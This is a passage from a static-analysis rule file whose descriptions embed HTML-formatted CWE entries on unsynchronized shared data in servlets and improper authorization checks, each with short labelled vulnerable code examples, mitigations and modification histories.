Potential Mitigations&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-03-10&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-07-27&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Demonstrative Examples&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2009-12-28&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Background Details, Common Consequences,
Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1666</key><name>Unsynchronized_Access_To_Shared_Data</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Unsynchronized Access to Shared Data&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;567&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Base)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_567_Description" id="oc_567_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product does not properly synchronize shared data, such as
static variables across threads, which can lead to undefined behavior and
unpredictable data changes.&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_567_Time of Introduction" id="oc_567_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_567_Applicable Platforms" id="oc_567_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;All&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_567_Demonstrative Examples" id="oc_567_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;&lt;div class="indent "&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;public static class Counter extends HttpServlet {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;static int count = 0;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;protected void doGet(HttpServletRequest in,
HttpServletResponse out)&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;throws ServletException, IOException {&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;out.setContentType("text/plain");&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;PrintWriter p = out.getWriter();&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;count++;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;p.println(count + " hits so far!");&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Potential Mitigations"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Potential Mitigations&lt;/div&gt;&lt;div name="oc_567_Potential Mitigations" id="oc_567_Potential Mitigations" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p&gt;A shared variable vulnerability can be prevented by removing the use
of static variables used between servlets or to provide protection when
shared access is absolutely needed. In this case, access should be
synchronized.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Other Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Other Notes&lt;/div&gt;&lt;div name="oc_567_Other Notes" id="oc_567_Other Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;The vulnerability can exist in servlets because a servlet is
multi-threaded, and shared static variables are not protected from
concurrent access. This is a typical programming mistake in J2EE
applications, since the multi-threading is handled by the framework. The use
of shared variables can be exploited by attackers to gain information or to
cause denial of service conditions. If this shared data contains sensitive
information, it may be manipulated or displayed in another user session. If
this data is used to control the application, its value can be manipulated
to cause the application to crash or perform poorly.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Relationships"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Relationships&lt;/div&gt;&lt;div name="oc_567_Relationships" id="oc_567_Relationships" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" id="Detail"&gt;&lt;tr&gt;&lt;th valign="top"&gt;Nature&lt;/th&gt;&lt;th valign="top"&gt;Type&lt;/th&gt;&lt;th valign="top"&gt;ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Name&lt;/th&gt;&lt;th valign="middle" class="left" style="text-align:center"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;View(s) this relationship pertains to&lt;/span&gt;&lt;/span&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Category&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;557&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=557" target="_blank"&gt;Concurrency Issues&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Development Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;699&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;ChildOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Base&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;662&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=662" target="_blank"&gt;Insufficient Synchronization&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;b&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts &lt;b&gt;(primary)&lt;/b&gt;&lt;/span&gt;1000&lt;/span&gt;&lt;/b&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;tbody&gt;&lt;tr class="primary"&gt;&lt;td valign="top"&gt;PeerOf&lt;/td&gt;&lt;td valign="top" nowrap="" class="right" align="center" style="padding-top:1px"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Weakness Variant&lt;/span&gt;&lt;/span&gt;&lt;/td&gt;&lt;td valign="top"&gt;488&lt;/td&gt;&lt;td valign="top"&gt;&lt;a href="cwe.aspx?cweid=488" target="_blank"&gt;Data Leak Between Sessions&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div class="left"&gt;&lt;span class="tool"&gt;&lt;span class="tip"&gt;Research Concepts&lt;/span&gt;1000&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;

&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Related Attack Patterns"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Related Attack Patterns&lt;/div&gt;&lt;div name="oc_567_Related Attack Patterns" id="oc_567_Related Attack Patterns" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;CAPEC-ID&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Attack Pattern Name&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;&lt;div style="font-weight:normal; font-size:85%; font-style:italic; color:#000000"&gt;(CAPEC Version: 1.5)&lt;/div&gt;&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://capec.mitre.org25.html" target="_blank"&gt;25&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Forced Deadlock&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Content History"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Content History&lt;/div&gt;&lt;div name="oc_567_Content History" id="oc_567_Content History" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" colspan="5" class="title"&gt;Modifications&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Modification Date&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Modifier&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Organization&lt;/th&gt;&lt;th valign="top" nowrap=""&gt;Source&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-07-01&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Eric Dalci&lt;/td&gt;&lt;td valign="top"&gt;Cigital&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;External&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Time of Introduction&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" nowrap="" rowspan="2" style="border-bottom:1px solid #BAC5E3"&gt;2008-09-08&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;CWE Content Team&lt;/td&gt;&lt;td valign="top"&gt;MITRE&lt;/td&gt;&lt;td valign="top" nowrap=""&gt;Internal&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td valign="top" colspan="3" style="border-bottom:1px solid #BAC5E3; font-size:90%; background-color:#eeeeee"&gt;updated Relationships, Other Notes&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;

&lt;/html&gt;

&lt;div align="right" style="padding-top:5px; padding-bottom:5px; clear:right" class="noprint"&gt;&lt;a class="backtop" href="#top"&gt;Back to top&lt;/a&gt;&lt;/div&gt;

&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;/html&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3890</key><name>Improper_Resource_Access_Authorization</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Improper Access Control (Authorization)&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;285&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Class)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Draft"&gt;Draft&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_285_Description" id="oc_285_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The software does not perform or incorrectly performs access
control checks across all potential execution paths.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;When access control checks are not applied consistently - or not at all -
users are able to access data or perform actions that they should not be
allowed to perform. This can lead to a wide range of problems, including
information leaks, denial of service, and arbitrary code execution.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Alternate Terms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Alternate Terms&lt;/div&gt;&lt;div name="oc_285_Alternate Terms" id="oc_285_Alternate Terms" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;AuthZ:&lt;/th&gt;&lt;td valign="top" width="100%"&gt;

&lt;p&gt;"AuthZ" is typically used as an abbreviation of "authorization" within
the web application security community. It is also distinct from
"AuthC," which is an abbreviation of "authentication." The use of "Auth"
as an abbreviation is discouraged, since it could be used for either
authentication or authorization.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_285_Time of Introduction" id="oc_285_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;li&gt;Operation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_285_Applicable Platforms" id="oc_285_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Language-independent&lt;/p&gt;
&lt;/div&gt;
&lt;p class="subheading"&gt;Technology Classes&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Web-Server: &lt;span class="smaller" style="font-style:italic"&gt;(Often)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Database-Server: &lt;span class="smaller" style="font-style:italic"&gt;(Often)&lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Modes of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Modes of Introduction&lt;/div&gt;&lt;div name="oc_285_Modes of Introduction" id="oc_285_Modes of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;A developer may introduce authorization weaknesses because of a lack of
understanding about the underlying technologies. For example, a developer
may assume that attackers cannot modify certain inputs such as headers or
cookies.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;Authorization weaknesses may arise when a single-user application is
ported to a multi-user environment.&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_285_Common Consequences" id="oc_285_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker could read sensitive data, either by reading the data
directly from a data store that is not properly restricted, or by
accessing insufficiently-protected, privileged functionality to read the
data.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker could modify sensitive data, either by writing the data
directly to a data store that is not properly restricted, or by
accessing insufficiently-protected, privileged functionality to write
the data.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker could gain privileges by modifying or reading critical
data directly, or by accessing insufficiently-protected, privileged
functionality.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_285_Likelihood of Exploit" id="oc_285_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Detection Methods"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Detection Methods&lt;/div&gt;&lt;div name="oc_285_Detection Methods" id="oc_285_Detection Methods" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Static Analysis&lt;/p&gt;&lt;p&gt;Automated static analysis is useful for detecting commonly-used idioms
for authorization. A tool may be able to analyze related configuration
files, such as .htaccess in Apache web servers, or detect the usage of
commonly-used authorization libraries.&lt;/p&gt;&lt;p&gt;Generally, automated static analysis tools have difficulty detecting
custom authorization schemes. In addition, the software's design may
include some functionality that is accessible to any user and does not
require an authorization check; an automated technique that detects the
absence of authorization may report false positives.&lt;/p&gt;&lt;p class="optheading"&gt;&lt;i&gt;Effectiveness: Limited&lt;/i&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Dynamic Analysis&lt;/p&gt;&lt;p&gt;Automated dynamic analysis may find many or all possible interfaces
that do not require authorization, but manual analysis is required to
determine if the lack of authorization violates business logic&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Analysis&lt;/p&gt;&lt;p&gt;This weakness can be detected using tools and techniques that require
manual (human) analysis, such as penetration testing, threat modeling,
and interactive tools that allow the tester to record and modify an
active session. &lt;/p&gt;&lt;p&gt;Specifically, manual static analysis is useful for evaluating the
correctness of custom authorization mechanisms.&lt;/p&gt;&lt;p class="optheading"&gt;&lt;i&gt;Effectiveness: Moderate&lt;/i&gt;&lt;/p&gt;&lt;div class="indent smaller"&gt;
&lt;p&gt; These may be more effective than strictly automated techniques. This
is especially the case with weaknesses that are related to design and
business rules. However, manual efforts might not achieve desired code
coverage within limited time constraints.&lt;/p&gt;
&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_285_Demonstrative Examples" id="oc_285_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;The following program could be part of a bulletin board system that
allows users to send private messages to each other. This program intends to
authenticate the user before deciding whether a private message should be
displayed. Assume that LookupMessageObject() ensures that the $id argument
is numeric, constructs a filename based on that id, and reads the message
details from that file. Also assume that the program stores all private
messages for all users in the same directory.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Perl&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;sub DisplayPrivateMessage {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;my($id) = @_;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;my $Message = LookupMessageObject($id);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;print "From: " . encodeHTML($Message-&amp;gt;{from}) .
"&amp;lt;br&amp;gt;\n";&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;print "Subject: " . encodeHTML($Message-&amp;gt;{subject}) .
"\n";&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;print "&amp;lt;hr&amp;gt;\n";&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;print "Body: " . encodeHTML($Message-&amp;gt;{body}) .
"\n";&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;my $q = new CGI;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;# For purposes of this example, assume that CWE-309
and&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;# CWE-523 do not apply.&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if (! AuthenticateUser($q-&amp;gt;param('username'),
$q-&amp;gt;param('password'))) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;ExitError("invalid username or password");&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;br&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;my $id = $q-&amp;gt;param('id');&lt;/div&gt;&lt;div style="font-size:90%;"&gt;DisplayPrivateMessage($id);&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;While the program properly exits if authentication fails, it does not
ensure that the message is addressed to the user. As a result, an
authenticated attacker could provide any arbitrary identifier and read
private messages that were intended for other users.&lt;/p&gt;&lt;p&gt;One way to avoid this problem would be to ensure that the "to" field
in the message object matches the username of the authenticated user.
&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_285_Observed Examples" id="oc_285_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3168" target="_blank"&gt;CVE-2009-3168&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Web application does not restrict access to admin
scripts, allowing authenticated users to reset administrative
passwords.&lt;/td&gt;&lt;/tr&gt;
